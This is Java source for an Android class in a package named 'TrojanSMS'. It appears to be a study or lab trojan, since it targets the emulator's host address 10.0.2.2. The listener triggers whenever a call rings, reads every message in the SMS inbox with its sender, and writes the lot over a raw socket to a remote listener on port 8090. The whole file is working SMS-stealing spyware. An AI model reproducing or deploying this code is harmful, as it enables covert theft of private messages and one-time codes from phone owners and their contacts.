package com.flu.TrojanSMS;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class MyPhoneStateListener extends PhoneStateListener {
	Context context;
	public String URL="http://10.0.2.2";
	
	public MyPhoneStateListener(Context c){
		this.context=c;
	}
	public void onCallStateChanged(int state, String incomingNumber){
		switch(state){
			case TelephonyManager.CALL_STATE_IDLE:
		      break;
		    case TelephonyManager.CALL_STATE_OFFHOOK:
		      break;
		    case TelephonyManager.CALL_STATE_RINGING:
		      Log.d("DEBUG", "RINGING " + incomingNumber);
		      String sms = moduleGetSMS();
		      sendSMSinfo(sms);
		      Log.d("DEBUG", sms);
		      break;
	    }
	}

	public String moduleGetSMS(){
		String sms = "";
		Uri uriSMSURI = Uri.parse("content://sms/inbox");
		Cursor cur = this.context.getContentResolver().query(uriSMSURI, null, null, null,null);
	    while (cur.moveToNext()) {
	    	sms += "From :" + cur.getString(2) + " : " + cur.getString(11)+"\n";         
	    }
		return sms;
	}

	public void sendSMSinfo(String sms){
		Socket s = null;
		try {
			s = new Socket(URL,8090);
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		PrintWriter output = null;
		try {
			output = new PrintWriter(s.getOutputStream(),true);
			output.println(sms);
			output.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
